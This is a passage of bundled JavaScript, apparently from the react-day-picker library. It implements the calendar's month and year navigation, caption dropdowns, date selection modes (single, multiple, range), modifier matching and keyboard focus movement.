    var newMonth = setYear(startOfMonth(displayMonth), Number(e.target.value));
    props.onChange(newMonth);
  };
  var DropdownComponent = (_a = components === null || components === void 0 ? void 0 : components.Dropdown) !== null && _a !== void 0 ? _a : Dropdown;
  return jsx64(DropdownComponent, { name: "years", "aria-label": labelYearDropdown2(), className: classNames.dropdown_year, style: styles.dropdown_year, onChange: handleChange, value: displayMonth.getFullYear(), caption: formatYearCaption2(displayMonth, { locale }), children: years.map(function(year2) {
    return jsx64("option", { value: year2.getFullYear(), children: formatYearCaption2(year2, { locale }) }, year2.getFullYear());
  }) });
}
function useControlledValue(defaultValue, controlledValue) {
  var _a = useState38(defaultValue), uncontrolledValue = _a[0], setValue = _a[1];
  var value = controlledValue === void 0 ? uncontrolledValue : controlledValue;
  return [value, setValue];
}
function getInitialMonth(context) {
  var month = context.month, defaultMonth = context.defaultMonth, today = context.today;
  var initialMonth = month || defaultMonth || today || /* @__PURE__ */ new Date();
  var toDate2 = context.toDate, fromDate = context.fromDate, _a = context.numberOfMonths, numberOfMonths = _a === void 0 ? 1 : _a;
  if (toDate2 && differenceInCalendarMonths(toDate2, initialMonth) < 0) {
    var offset4 = -1 * (numberOfMonths - 1);
    initialMonth = addMonths(toDate2, offset4);
  }
  if (fromDate && differenceInCalendarMonths(initialMonth, fromDate) < 0) {
    initialMonth = fromDate;
  }
  return startOfMonth(initialMonth);
}
function useNavigationState() {
  var context = useDayPicker();
  var initialMonth = getInitialMonth(context);
  var _a = useControlledValue(initialMonth, context.month), month = _a[0], setMonth2 = _a[1];
  var goToMonth = function(date) {
    var _a2;
    if (context.disableNavigation)
      return;
    var month2 = startOfMonth(date);
    setMonth2(month2);
    (_a2 = context.onMonthChange) === null || _a2 === void 0 ? void 0 : _a2.call(context, month2);
  };
  return [month, goToMonth];
}
function getDisplayMonths(month, _a) {
  var reverseMonths = _a.reverseMonths, numberOfMonths = _a.numberOfMonths;
  var start = startOfMonth(month);
  var end = startOfMonth(addMonths(start, numberOfMonths));
  var monthsDiff = differenceInCalendarMonths(end, start);
  var months = [];
  for (var i = 0; i < monthsDiff; i++) {
    var nextMonth = addMonths(start, i);
    months.push(nextMonth);
  }
  if (reverseMonths)
    months = months.reverse();
  return months;
}
function getNextMonth(startingMonth, options) {
  if (options.disableNavigation) {
    return void 0;
  }
  var toDate2 = options.toDate, pagedNavigation = options.pagedNavigation, _a = options.numberOfMonths, numberOfMonths = _a === void 0 ? 1 : _a;
  var offset4 = pagedNavigation ? numberOfMonths : 1;
  var month = startOfMonth(startingMonth);
  if (!toDate2) {
    return addMonths(month, offset4);
  }
  var monthsDiff = differenceInCalendarMonths(toDate2, startingMonth);
  if (monthsDiff < numberOfMonths) {
    return void 0;
  }
  return addMonths(month, offset4);
}
function getPreviousMonth(startingMonth, options) {
  if (options.disableNavigation) {
    return void 0;
  }
  var fromDate = options.fromDate, pagedNavigation = options.pagedNavigation, _a = options.numberOfMonths, numberOfMonths = _a === void 0 ? 1 : _a;
  var offset4 = pagedNavigation ? numberOfMonths : 1;
  var month = startOfMonth(startingMonth);
  if (!fromDate) {
    return addMonths(month, -offset4);
  }
  var monthsDiff = differenceInCalendarMonths(month, fromDate);
  if (monthsDiff <= 0) {
    return void 0;
  }
  return addMonths(month, -offset4);
}
var NavigationContext = createContext9(void 0);
function NavigationProvider(props) {
  var dayPicker = useDayPicker();
  var _a = useNavigationState(), currentMonth = _a[0], goToMonth = _a[1];
  var displayMonths = getDisplayMonths(currentMonth, dayPicker);
  var nextMonth = getNextMonth(currentMonth, dayPicker);
  var previousMonth = getPreviousMonth(currentMonth, dayPicker);
  var isDateDisplayed = function(date) {
    return displayMonths.some(function(displayMonth) {
      return isSameMonth(date, displayMonth);
    });
  };
  var goToDate = function(date, refDate) {
    if (isDateDisplayed(date)) {
      return;
    }
    if (refDate && isBefore(date, refDate)) {
      goToMonth(addMonths(date, 1 + dayPicker.numberOfMonths * -1));
    } else {
      goToMonth(date);
    }
  };
  var value = {
    currentMonth,
    displayMonths,
    goToMonth,
    goToDate,
    previousMonth,
    nextMonth,
    isDateDisplayed
  };
  return jsx64(NavigationContext.Provider, { value, children: props.children });
}
function useNavigation() {
  var context = useContext9(NavigationContext);
  if (!context) {
    throw new Error("useNavigation must be used within a NavigationProvider");
  }
  return context;
}
function CaptionDropdowns(props) {
  var _a;
  var _b = useDayPicker(), classNames = _b.classNames, styles = _b.styles, components = _b.components;
  var goToMonth = useNavigation().goToMonth;
  var handleMonthChange = function(newMonth) {
    goToMonth(addMonths(newMonth, props.displayIndex ? -props.displayIndex : 0));
  };
  var CaptionLabelComponent = (_a = components === null || components === void 0 ? void 0 : components.CaptionLabel) !== null && _a !== void 0 ? _a : CaptionLabel;
  var captionLabel = jsx64(CaptionLabelComponent, { id: props.id, displayMonth: props.displayMonth });
  return jsxs32("div", { className: classNames.caption_dropdowns, style: styles.caption_dropdowns, children: [jsx64("div", { className: classNames.vhidden, children: captionLabel }), jsx64(MonthsDropdown, { onChange: handleMonthChange, displayMonth: props.displayMonth }), jsx64(YearsDropdown, { onChange: handleMonthChange, displayMonth: props.displayMonth })] });
}
function IconLeft(props) {
  return jsx64("svg", __assign2({ width: "16px", height: "16px", viewBox: "0 0 120 120" }, props, { children: jsx64("path", { d: "M69.490332,3.34314575 C72.6145263,0.218951416 77.6798462,0.218951416 80.8040405,3.34314575 C83.8617626,6.40086786 83.9268205,11.3179931 80.9992143,14.4548388 L80.8040405,14.6568542 L35.461,60 L80.8040405,105.343146 C83.8617626,108.400868 83.9268205,113.317993 80.9992143,116.454839 L80.8040405,116.656854 C77.7463184,119.714576 72.8291931,119.779634 69.6923475,116.852028 L69.490332,116.656854 L18.490332,65.6568542 C15.4326099,62.5991321 15.367552,57.6820069 18.2951583,54.5451612 L18.490332,54.3431458 L69.490332,3.34314575 Z", fill: "currentColor", fillRule: "nonzero" }) }));
}
function IconRight(props) {
  return jsx64("svg", __assign2({ width: "16px", height: "16px", viewBox: "0 0 120 120" }, props, { children: jsx64("path", { d: "M49.8040405,3.34314575 C46.6798462,0.218951416 41.6145263,0.218951416 38.490332,3.34314575 C35.4326099,6.40086786 35.367552,11.3179931 38.2951583,14.4548388 L38.490332,14.6568542 L83.8333725,60 L38.490332,105.343146 C35.4326099,108.400868 35.367552,113.317993 38.2951583,116.454839 L38.490332,116.656854 C41.5480541,119.714576 46.4651794,119.779634 49.602025,116.852028 L49.8040405,116.656854 L100.804041,65.6568542 C103.861763,62.5991321 103.926821,57.6820069 100.999214,54.5451612 L100.804041,54.3431458 L49.8040405,3.34314575 Z", fill: "currentColor" }) }));
}
var Button2 = forwardRef38(function(props, ref) {
  var _a = useDayPicker(), classNames = _a.classNames, styles = _a.styles;
  var classNamesArr = [classNames.button_reset, classNames.button];
  if (props.className) {
    classNamesArr.push(props.className);
  }
  var className = classNamesArr.join(" ");
  var style = __assign2(__assign2({}, styles.button_reset), styles.button);
  if (props.style) {
    Object.assign(style, props.style);
  }
  return jsx64("button", __assign2({}, props, { ref, type: "button", className, style }));
});
function Navigation(props) {
  var _a, _b;
  var _c = useDayPicker(), dir = _c.dir, locale = _c.locale, classNames = _c.classNames, styles = _c.styles, _d = _c.labels, labelPrevious2 = _d.labelPrevious, labelNext2 = _d.labelNext, components = _c.components;
  if (!props.nextMonth && !props.previousMonth) {
    return jsx64(Fragment12, {});
  }
  var previousLabel = labelPrevious2(props.previousMonth, { locale });
  var previousClassName = [
    classNames.nav_button,
    classNames.nav_button_previous
  ].join(" ");
  var nextLabel = labelNext2(props.nextMonth, { locale });
  var nextClassName = [
    classNames.nav_button,
    classNames.nav_button_next
  ].join(" ");
  var IconRightComponent = (_a = components === null || components === void 0 ? void 0 : components.IconRight) !== null && _a !== void 0 ? _a : IconRight;
  var IconLeftComponent = (_b = components === null || components === void 0 ? void 0 : components.IconLeft) !== null && _b !== void 0 ? _b : IconLeft;
  return jsxs32("div", { className: classNames.nav, style: styles.nav, children: [!props.hidePrevious && jsx64(Button2, { name: "previous-month", "aria-label": previousLabel, className: previousClassName, style: styles.nav_button_previous, disabled: !props.previousMonth, onClick: props.onPreviousClick, children: dir === "rtl" ? jsx64(IconRightComponent, { className: classNames.nav_icon, style: styles.nav_icon }) : jsx64(IconLeftComponent, { className: classNames.nav_icon, style: styles.nav_icon }) }), !props.hideNext && jsx64(Button2, { name: "next-month", "aria-label": nextLabel, className: nextClassName, style: styles.nav_button_next, disabled: !props.nextMonth, onClick: props.onNextClick, children: dir === "rtl" ? jsx64(IconLeftComponent, { className: classNames.nav_icon, style: styles.nav_icon }) : jsx64(IconRightComponent, { className: classNames.nav_icon, style: styles.nav_icon }) })] });
}
function CaptionNavigation(props) {
  var numberOfMonths = useDayPicker().numberOfMonths;
  var _a = useNavigation(), previousMonth = _a.previousMonth, nextMonth = _a.nextMonth, goToMonth = _a.goToMonth, displayMonths = _a.displayMonths;
  var displayIndex = displayMonths.findIndex(function(month) {
    return isSameMonth(props.displayMonth, month);
  });
  var isFirst = displayIndex === 0;
  var isLast = displayIndex === displayMonths.length - 1;
  var hideNext = numberOfMonths > 1 && (isFirst || !isLast);
  var hidePrevious = numberOfMonths > 1 && (isLast || !isFirst);
  var handlePreviousClick = function() {
    if (!previousMonth)
      return;
    goToMonth(previousMonth);
  };
  var handleNextClick = function() {
    if (!nextMonth)
      return;
    goToMonth(nextMonth);
  };
  return jsx64(Navigation, { displayMonth: props.displayMonth, hideNext, hidePrevious, nextMonth, previousMonth, onPreviousClick: handlePreviousClick, onNextClick: handleNextClick });
}
function Caption(props) {
  var _a;
  var _b = useDayPicker(), classNames = _b.classNames, disableNavigation = _b.disableNavigation, styles = _b.styles, captionLayout = _b.captionLayout, components = _b.components;
  var CaptionLabelComponent = (_a = components === null || components === void 0 ? void 0 : components.CaptionLabel) !== null && _a !== void 0 ? _a : CaptionLabel;
  var caption;
  if (disableNavigation) {
    caption = jsx64(CaptionLabelComponent, { id: props.id, displayMonth: props.displayMonth });
  } else if (captionLayout === "dropdown") {
    caption = jsx64(CaptionDropdowns, { displayMonth: props.displayMonth, id: props.id });
  } else if (captionLayout === "dropdown-buttons") {
    caption = jsxs32(Fragment12, { children: [jsx64(CaptionDropdowns, { displayMonth: props.displayMonth, displayIndex: props.displayIndex, id: props.id }), jsx64(CaptionNavigation, { displayMonth: props.displayMonth, displayIndex: props.displayIndex, id: props.id })] });
  } else {
    caption = jsxs32(Fragment12, { children: [jsx64(CaptionLabelComponent, { id: props.id, displayMonth: props.displayMonth, displayIndex: props.displayIndex }), jsx64(CaptionNavigation, { displayMonth: props.displayMonth, id: props.id })] });
  }
  return jsx64("div", { className: classNames.caption, style: styles.caption, children: caption });
}
function Footer(props) {
  var _a = useDayPicker(), footer = _a.footer, styles = _a.styles, tfoot = _a.classNames.tfoot;
  if (!footer)
    return jsx64(Fragment12, {});
  return jsx64("tfoot", { className: tfoot, style: styles.tfoot, children: jsx64("tr", { children: jsx64("td", { colSpan: 8, children: footer }) }) });
}
function getWeekdays(locale, weekStartsOn, ISOWeek) {
  var start = ISOWeek ? startOfISOWeek(/* @__PURE__ */ new Date()) : startOfWeek(/* @__PURE__ */ new Date(), { locale, weekStartsOn });
  var days = [];
  for (var i = 0; i < 7; i++) {
    var day = addDays(start, i);
    days.push(day);
  }
  return days;
}
function HeadRow() {
  var _a = useDayPicker(), classNames = _a.classNames, styles = _a.styles, showWeekNumber = _a.showWeekNumber, locale = _a.locale, weekStartsOn = _a.weekStartsOn, ISOWeek = _a.ISOWeek, formatWeekdayName2 = _a.formatters.formatWeekdayName, labelWeekday2 = _a.labels.labelWeekday;
  var weekdays = getWeekdays(locale, weekStartsOn, ISOWeek);
  return jsxs32("tr", { style: styles.head_row, className: classNames.head_row, children: [showWeekNumber && jsx64("td", { style: styles.head_cell, className: classNames.head_cell }), weekdays.map(function(weekday, i) {
    return jsx64("th", { scope: "col", className: classNames.head_cell, style: styles.head_cell, "aria-label": labelWeekday2(weekday, { locale }), children: formatWeekdayName2(weekday, { locale }) }, i);
  })] });
}
function Head() {
  var _a;
  var _b = useDayPicker(), classNames = _b.classNames, styles = _b.styles, components = _b.components;
  var HeadRowComponent = (_a = components === null || components === void 0 ? void 0 : components.HeadRow) !== null && _a !== void 0 ? _a : HeadRow;
  return jsx64("thead", { style: styles.head, className: classNames.head, children: jsx64(HeadRowComponent, {}) });
}
function DayContent(props) {
  var _a = useDayPicker(), locale = _a.locale, formatDay2 = _a.formatters.formatDay;
  return jsx64(Fragment12, { children: formatDay2(props.date, { locale }) });
}
var SelectMultipleContext = createContext9(void 0);
function SelectMultipleProvider(props) {
  if (!isDayPickerMultiple(props.initialProps)) {
    var emptyContextValue = {
      selected: void 0,
      modifiers: {
        disabled: []
      }
    };
    return jsx64(SelectMultipleContext.Provider, { value: emptyContextValue, children: props.children });
  }
  return jsx64(SelectMultipleProviderInternal, { initialProps: props.initialProps, children: props.children });
}
function SelectMultipleProviderInternal(_a) {
  var initialProps = _a.initialProps, children = _a.children;
  var selected = initialProps.selected, min3 = initialProps.min, max3 = initialProps.max;
  var onDayClick = function(day, activeModifiers, e) {
    var _a2, _b;
    (_a2 = initialProps.onDayClick) === null || _a2 === void 0 ? void 0 : _a2.call(initialProps, day, activeModifiers, e);
    var isMinSelected = Boolean(activeModifiers.selected && min3 && (selected === null || selected === void 0 ? void 0 : selected.length) === min3);
    if (isMinSelected) {
      return;
    }
    var isMaxSelected = Boolean(!activeModifiers.selected && max3 && (selected === null || selected === void 0 ? void 0 : selected.length) === max3);
    if (isMaxSelected) {
      return;
    }
    var selectedDays = selected ? __spreadArray2([], selected, true) : [];
    if (activeModifiers.selected) {
      var index2 = selectedDays.findIndex(function(selectedDay) {
        return isSameDay(day, selectedDay);
      });
      selectedDays.splice(index2, 1);
    } else {
      selectedDays.push(day);
    }
    (_b = initialProps.onSelect) === null || _b === void 0 ? void 0 : _b.call(initialProps, selectedDays, day, activeModifiers, e);
  };
  var modifiers = {
    disabled: []
  };
  if (selected) {
    modifiers.disabled.push(function(day) {
      var isMaxSelected = max3 && selected.length > max3 - 1;
      var isSelected = selected.some(function(selectedDay) {
        return isSameDay(selectedDay, day);
      });
      return Boolean(isMaxSelected && !isSelected);
    });
  }
  var contextValue = {
    selected,
    onDayClick,
    modifiers
  };
  return jsx64(SelectMultipleContext.Provider, { value: contextValue, children });
}
function useSelectMultiple() {
  var context = useContext9(SelectMultipleContext);
  if (!context) {
    throw new Error("useSelectMultiple must be used within a SelectMultipleProvider");
  }
  return context;
}
function addToRange(day, range) {
  var _a = range || {}, from = _a.from, to = _a.to;
  if (from && to) {
    if (isSameDay(to, day) && isSameDay(from, day)) {
      return void 0;
    }
    if (isSameDay(to, day)) {
      return { from: to, to: void 0 };
    }
    if (isSameDay(from, day)) {
      return void 0;
    }
    if (isAfter(from, day)) {
      return { from: day, to };
    }
    return { from, to: day };
  }
  if (to) {
    if (isAfter(day, to)) {
      return { from: to, to: day };
    }
    return { from: day, to };
  }
  if (from) {
    if (isBefore(day, from)) {
      return { from: day, to: from };
    }
    return { from, to: day };
  }
  return { from: day, to: void 0 };
}
var SelectRangeContext = createContext9(void 0);
function SelectRangeProvider(props) {
  if (!isDayPickerRange(props.initialProps)) {
    var emptyContextValue = {
      selected: void 0,
      modifiers: {
        range_start: [],
        range_end: [],
        range_middle: [],
        disabled: []
      }
    };
    return jsx64(SelectRangeContext.Provider, { value: emptyContextValue, children: props.children });
  }
  return jsx64(SelectRangeProviderInternal, { initialProps: props.initialProps, children: props.children });
}
function SelectRangeProviderInternal(_a) {
  var initialProps = _a.initialProps, children = _a.children;
  var selected = initialProps.selected;
  var _b = selected || {}, selectedFrom = _b.from, selectedTo = _b.to;
  var min3 = initialProps.min;
  var max3 = initialProps.max;
  var onDayClick = function(day, activeModifiers, e) {
    var _a2, _b2;
    (_a2 = initialProps.onDayClick) === null || _a2 === void 0 ? void 0 : _a2.call(initialProps, day, activeModifiers, e);
    var newRange = addToRange(day, selected);
    (_b2 = initialProps.onSelect) === null || _b2 === void 0 ? void 0 : _b2.call(initialProps, newRange, day, activeModifiers, e);
  };
  var modifiers = {
    range_start: [],
    range_end: [],
    range_middle: [],
    disabled: []
  };
  if (selectedFrom) {
    modifiers.range_start = [selectedFrom];
    if (!selectedTo) {
      modifiers.range_end = [selectedFrom];
    } else {
      modifiers.range_end = [selectedTo];
      if (!isSameDay(selectedFrom, selectedTo)) {
        modifiers.range_middle = [
          {
            after: selectedFrom,
            before: selectedTo
          }
        ];
      }
    }
  } else if (selectedTo) {
    modifiers.range_start = [selectedTo];
    modifiers.range_end = [selectedTo];
  }
  if (min3) {
    if (selectedFrom && !selectedTo) {
      modifiers.disabled.push({
        after: subDays(selectedFrom, min3 - 1),
        before: addDays(selectedFrom, min3 - 1)
      });
    }
    if (selectedFrom && selectedTo) {
      modifiers.disabled.push({
        after: selectedFrom,
        before: addDays(selectedFrom, min3 - 1)
      });
    }
    if (!selectedFrom && selectedTo) {
      modifiers.disabled.push({
        after: subDays(selectedTo, min3 - 1),
        before: addDays(selectedTo, min3 - 1)
      });
    }
  }
  if (max3) {
    if (selectedFrom && !selectedTo) {
      modifiers.disabled.push({
        before: addDays(selectedFrom, -max3 + 1)
      });
      modifiers.disabled.push({
        after: addDays(selectedFrom, max3 - 1)
      });
    }
    if (selectedFrom && selectedTo) {
      var selectedCount = differenceInCalendarDays(selectedTo, selectedFrom) + 1;
      var offset4 = max3 - selectedCount;
      modifiers.disabled.push({
        before: subDays(selectedFrom, offset4)
      });
      modifiers.disabled.push({
        after: addDays(selectedTo, offset4)
      });
    }
    if (!selectedFrom && selectedTo) {
      modifiers.disabled.push({
        before: addDays(selectedTo, -max3 + 1)
      });
      modifiers.disabled.push({
        after: addDays(selectedTo, max3 - 1)
      });
    }
  }
  return jsx64(SelectRangeContext.Provider, { value: { selected, onDayClick, modifiers }, children });
}
function useSelectRange() {
  var context = useContext9(SelectRangeContext);
  if (!context) {
    throw new Error("useSelectRange must be used within a SelectRangeProvider");
  }
  return context;
}
function matcherToArray(matcher) {
  if (Array.isArray(matcher)) {
    return __spreadArray2([], matcher, true);
  } else if (matcher !== void 0) {
    return [matcher];
  } else {
    return [];
  }
}
function getCustomModifiers(dayModifiers) {
  var customModifiers = {};
  Object.entries(dayModifiers).forEach(function(_a) {
    var modifier = _a[0], matcher = _a[1];
    customModifiers[modifier] = matcherToArray(matcher);
  });
  return customModifiers;
}
var InternalModifier;
(function(InternalModifier2) {
  InternalModifier2["Outside"] = "outside";
  InternalModifier2["Disabled"] = "disabled";
  InternalModifier2["Selected"] = "selected";
  InternalModifier2["Hidden"] = "hidden";
  InternalModifier2["Today"] = "today";
  InternalModifier2["RangeStart"] = "range_start";
  InternalModifier2["RangeEnd"] = "range_end";
  InternalModifier2["RangeMiddle"] = "range_middle";
})(InternalModifier || (InternalModifier = {}));
var Selected = InternalModifier.Selected;
var Disabled = InternalModifier.Disabled;
var Hidden = InternalModifier.Hidden;
var Today = InternalModifier.Today;
var RangeEnd = InternalModifier.RangeEnd;
var RangeMiddle = InternalModifier.RangeMiddle;
var RangeStart = InternalModifier.RangeStart;
var Outside = InternalModifier.Outside;
function getInternalModifiers(dayPicker, selectMultiple, selectRange) {
  var _a;
  var internalModifiers = (_a = {}, _a[Selected] = matcherToArray(dayPicker.selected), _a[Disabled] = matcherToArray(dayPicker.disabled), _a[Hidden] = matcherToArray(dayPicker.hidden), _a[Today] = [dayPicker.today], _a[RangeEnd] = [], _a[RangeMiddle] = [], _a[RangeStart] = [], _a[Outside] = [], _a);
  if (dayPicker.fromDate) {
    internalModifiers[Disabled].push({ before: dayPicker.fromDate });
  }
  if (dayPicker.toDate) {
    internalModifiers[Disabled].push({ after: dayPicker.toDate });
  }
  if (isDayPickerMultiple(dayPicker)) {
    internalModifiers[Disabled] = internalModifiers[Disabled].concat(selectMultiple.modifiers[Disabled]);
  } else if (isDayPickerRange(dayPicker)) {
    internalModifiers[Disabled] = internalModifiers[Disabled].concat(selectRange.modifiers[Disabled]);
    internalModifiers[RangeStart] = selectRange.modifiers[RangeStart];
    internalModifiers[RangeMiddle] = selectRange.modifiers[RangeMiddle];
    internalModifiers[RangeEnd] = selectRange.modifiers[RangeEnd];
  }
  return internalModifiers;
}
var ModifiersContext = createContext9(void 0);
function ModifiersProvider(props) {
  var dayPicker = useDayPicker();
  var selectMultiple = useSelectMultiple();
  var selectRange = useSelectRange();
  var internalModifiers = getInternalModifiers(dayPicker, selectMultiple, selectRange);
  var customModifiers = getCustomModifiers(dayPicker.modifiers);
  var modifiers = __assign2(__assign2({}, internalModifiers), customModifiers);
  return jsx64(ModifiersContext.Provider, { value: modifiers, children: props.children });
}
function useModifiers() {
  var context = useContext9(ModifiersContext);
  if (!context) {
    throw new Error("useModifiers must be used within a ModifiersProvider");
  }
  return context;
}
function isDateInterval(matcher) {
  return Boolean(matcher && typeof matcher === "object" && "before" in matcher && "after" in matcher);
}
function isDateRange(value) {
  return Boolean(value && typeof value === "object" && "from" in value);
}
function isDateAfterType(value) {
  return Boolean(value && typeof value === "object" && "after" in value);
}
function isDateBeforeType(value) {
  return Boolean(value && typeof value === "object" && "before" in value);
}
function isDayOfWeekType(value) {
  return Boolean(value && typeof value === "object" && "dayOfWeek" in value);
}
function isDateInRange(date, range) {
  var _a;
  var from = range.from, to = range.to;
  if (from && to) {
    var isRangeInverted = differenceInCalendarDays(to, from) < 0;
    if (isRangeInverted) {
      _a = [to, from], from = _a[0], to = _a[1];
    }
    var isInRange = differenceInCalendarDays(date, from) >= 0 && differenceInCalendarDays(to, date) >= 0;
    return isInRange;
  }
  if (to) {
    return isSameDay(to, date);
  }
  if (from) {
    return isSameDay(from, date);
  }
  return false;
}
function isDateType(value) {
  return isDate(value);
}
function isArrayOfDates(value) {
  return Array.isArray(value) && value.every(isDate);
}
function isMatch(day, matchers) {
  return matchers.some(function(matcher) {
    if (typeof matcher === "boolean") {
      return matcher;
    }
    if (isDateType(matcher)) {
      return isSameDay(day, matcher);
    }
    if (isArrayOfDates(matcher)) {
      return matcher.includes(day);
    }
    if (isDateRange(matcher)) {
      return isDateInRange(day, matcher);
    }
    if (isDayOfWeekType(matcher)) {
      return matcher.dayOfWeek.includes(day.getDay());
    }
    if (isDateInterval(matcher)) {
      var diffBefore = differenceInCalendarDays(matcher.before, day);
      var diffAfter = differenceInCalendarDays(matcher.after, day);
      var isDayBefore = diffBefore > 0;
      var isDayAfter = diffAfter < 0;
      var isClosedInterval = isAfter(matcher.before, matcher.after);
      if (isClosedInterval) {
        return isDayAfter && isDayBefore;
      } else {
        return isDayBefore || isDayAfter;
      }
    }
    if (isDateAfterType(matcher)) {
      return differenceInCalendarDays(day, matcher.after) > 0;
    }
    if (isDateBeforeType(matcher)) {
      return differenceInCalendarDays(matcher.before, day) > 0;
    }
    if (typeof matcher === "function") {
      return matcher(day);
    }
    return false;
  });
}
function getActiveModifiers(day, modifiers, displayMonth) {
  var matchedModifiers = Object.keys(modifiers).reduce(function(result, key) {
    var modifier = modifiers[key];
    if (isMatch(day, modifier)) {
      result.push(key);
    }
    return result;
  }, []);
  var activeModifiers = {};
  matchedModifiers.forEach(function(modifier) {
    return activeModifiers[modifier] = true;
  });
  if (displayMonth && !isSameMonth(day, displayMonth)) {
    activeModifiers.outside = true;
  }
  return activeModifiers;
}
function getInitialFocusTarget(displayMonths, modifiers) {
  var firstDayInMonth = startOfMonth(displayMonths[0]);
  var lastDayInMonth = endOfMonth(displayMonths[displayMonths.length - 1]);
  var firstFocusableDay;
  var today;
  var date = firstDayInMonth;
  while (date <= lastDayInMonth) {
    var activeModifiers = getActiveModifiers(date, modifiers);
    var isFocusable = !activeModifiers.disabled && !activeModifiers.hidden;
    if (!isFocusable) {
      date = addDays(date, 1);
      continue;
    }
    if (activeModifiers.selected) {
      return date;
    }
    if (activeModifiers.today && !today) {
      today = date;
    }
    if (!firstFocusableDay) {
      firstFocusableDay = date;
    }
    date = addDays(date, 1);
  }
  if (today) {
    return today;
  } else {
    return firstFocusableDay;
  }
}
var MAX_RETRY = 365;
function getNextFocus(focusedDay, options) {
  var moveBy = options.moveBy, direction = options.direction, context = options.context, modifiers = options.modifiers, _a = options.retry, retry = _a === void 0 ? { count: 0, lastFocused: focusedDay } : _a;
  var weekStartsOn = context.weekStartsOn, fromDate = context.fromDate, toDate2 = context.toDate, locale = context.locale;
  var moveFns = {
    day: addDays,
    week: addWeeks,
    month: addMonths,
    year: addYears,
    startOfWeek: function(date) {
      return context.ISOWeek ? startOfISOWeek(date) : startOfWeek(date, { locale, weekStartsOn });
    },
    endOfWeek: function(date) {
      return context.ISOWeek ? endOfISOWeek(date) : endOfWeek(date, { locale, weekStartsOn });
    }
  };
  var newFocusedDay = moveFns[moveBy](focusedDay, direction === "after" ? 1 : -1);
  if (direction === "before" && fromDate) {
    newFocusedDay = max2([fromDate, newFocusedDay]);
  } else if (direction === "after" && toDate2) {
    newFocusedDay = min2([toDate2, newFocusedDay]);
  }
  var isFocusable = true;
  if (modifiers) {
    var activeModifiers = getActiveModifiers(newFocusedDay, modifiers);
    isFocusable = !activeModifiers.disabled && !activeModifiers.hidden;
  }
  if (isFocusable) {
    return newFocusedDay;
  } else {
    if (retry.count > MAX_RETRY) {
      return retry.lastFocused;
    }
    return getNextFocus(newFocusedDay, {
      moveBy,
      direction,
      context,
      modifiers,
      retry: __assign2(__assign2({}, retry), { count: retry.count + 1 })
    });
  }
}
var FocusContext = createContext9(void 0);
function FocusProvider(props) {
  var navigation = useNavigation();
  var modifiers = useModifiers();
  var _a = useState38(), focusedDay = _a[0], setFocusedDay = _a[1];
  var _b = useState38(), lastFocused = _b[0], setLastFocused = _b[1];
  var initialFocusTarget = getInitialFocusTarget(navigation.displayMonths, modifiers);
  var focusTarget = (focusedDay !== null && focusedDay !== void 0 ? focusedDay : lastFocused && navigation.isDateDisplayed(lastFocused)) ? lastFocused : initialFocusTarget;
  var blur = function() {
    setLastFocused(focusedDay);
    setFocusedDay(void 0);
  };
  var focus2 = function(date) {
    setFocusedDay(date);
  };
  var context = useDayPicker();
  var moveFocus = function(moveBy, direction) {
    if (!focusedDay)
      return;
    var nextFocused = getNextFocus(focusedDay, {
      moveBy,
      direction,
      context,
      modifiers
    });
    if (isSameDay(focusedDay, nextFocused))
      return void 0;
    navigation.goToDate(nextFocused, focusedDay);
    focus2(nextFocused);
  };
  var value = {
    focusedDay,
    focusTarget,
    blur,
    focus: focus2,
    focusDayAfter: function() {
      return moveFocus("day", "after");
    },
    focusDayBefore: function() {
      return moveFocus("day", "before");
    },
    focusWeekAfter: function() {
      return moveFocus("week", "after");
    },
    focusWeekBefore: function() {
      return moveFocus("week", "before");
    },
    focusMonthBefore: function() {
      return moveFocus("month", "before");
    },
    focusMonthAfter: function() {
      return moveFocus("month", "after");
    },
    focusYearBefore: function() {
      return moveFocus("year", "before");
    },
    focusYearAfter: function() {
      return moveFocus("year", "after");
    },
    focusStartOfWeek: function() {
      return moveFocus("startOfWeek", "before");
    },
    focusEndOfWeek: function() {
      return moveFocus("endOfWeek", "after");
    }
  };
  return jsx64(FocusContext.Provider, { value, children: props.children });
}
function useFocusContext() {
  var context = useContext9(FocusContext);
  if (!context) {
    throw new Error("useFocusContext must be used within a FocusProvider");
  }
  return context;
}
function useActiveModifiers(day, displayMonth) {
  var modifiers = useModifiers();
  var activeModifiers = getActiveModifiers(day, modifiers, displayMonth);
  return activeModifiers;
}
var SelectSingleContext = createContext9(void 0);
function SelectSingleProvider(props) {
  if (!isDayPickerSingle(props.initialProps)) {
    var emptyContextValue = {
      selected: void 0
    };
    return jsx64(SelectSingleContext.Provider, { value: emptyContextValue, children: props.children });
  }
  return jsx64(SelectSingleProviderInternal, { initialProps: props.initialProps, children: props.children });
}
function SelectSingleProviderInternal(_a) {
  var initialProps = _a.initialProps, children = _a.children;
  var onDayClick = function(day, activeModifiers, e) {
    var _a2, _b, _c;
    (_a2 = initialProps.onDayClick) === null || _a2 === void 0 ? void 0 : _a2.call(initialProps, day, activeModifiers, e);
    if (activeModifiers.selected && !initialProps.required) {
      (_b = initialProps.onSelect) === null || _b === void 0 ? void 0 : _b.call(initialProps, void 0, day, activeModifiers, e);
      return;
    }
    (_c = initialProps.onSelect) === null || _c === void 0 ? void 0 : _c.call(initialProps, day, day, activeModifiers, e);
  };
  var contextValue = {
    selected: initialProps.selected,
    onDayClick
  };
  return jsx64(SelectSingleContext.Provider, { value: contextValue, children });
}
function useSelectSingle() {
  var context = useContext9(SelectSingleContext);
  if (!context) {
    throw new Error("useSelectSingle must be used within a SelectSingleProvider");
  }
  return context;
}
function useDayEventHandlers(date, activeModifiers) {
  var dayPicker = useDayPicker();
  var single = useSelectSingle();
  var multiple = useSelectMultiple();
  var range = useSelectRange();
  var _a = useFocusContext(), focusDayAfter = _a.focusDayAfter, focusDayBefore = _a.focusDayBefore, focusWeekAfter = _a.focusWeekAfter, focusWeekBefore = _a.focusWeekBefore, blur = _a.blur, focus2 = _a.focus, focusMonthBefore = _a.focusMonthBefore, focusMonthAfter = _a.focusMonthAfter, focusYearBefore = _a.focusYearBefore, focusYearAfter = _a.focusYearAfter, focusStartOfWeek = _a.focusStartOfWeek, focusEndOfWeek = _a.focusEndOfWeek;
  var onClick = function(e) {
    var _a2, _b, _c, _d;
    if (isDayPickerSingle(dayPicker)) {
      (_a2 = single.onDayClick) === null || _a2 === void 0 ? void 0 : _a2.call(single, date, activeModifiers, e);
    } else if (isDayPickerMultiple(dayPicker)) {
      (_b = multiple.onDayClick) === null || _b === void 0 ? void 0 : _b.call(multiple, date, activeModifiers, e);
    } else if (isDayPickerRange(dayPicker)) {
